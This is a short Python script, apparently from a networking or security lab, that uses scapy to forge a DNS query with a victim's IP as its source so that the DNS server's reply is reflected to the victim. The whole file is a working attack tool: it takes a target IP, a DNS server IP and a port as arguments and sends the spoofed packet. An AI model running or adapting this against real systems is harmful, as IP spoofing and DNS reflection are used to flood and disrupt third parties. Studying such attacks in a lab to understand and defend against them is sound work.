from scapy.all import *
import argparse

#Input
parser = argparse.ArgumentParser(description="Simple DNS-Reflection script")
parser.add_argument("target_ip",    help="IP address of the victim")
parser.add_argument("dns_ip",       help="IP address of DNS Server")
parser.add_argument("dns_port",     help="DNS Port")
args = parser.parse_args()

#Variables
target_ip   =   args.target_ip
dns_ip      =   args.dns_ip
dns_port    =   int(args.dns_port)

#Send a DNS request in the name of WS2 so that WS2 gets a DNS response in port 5353
ip      = IP(src= target_ip, dst= dns_ip)
udp     = UDP(sport=RandShort(), dport= dns_port)
dns     = DNS(rd=1,qd=DNSQR(qname="example.com"))
packet  = ip/udp/dns
send(packet)
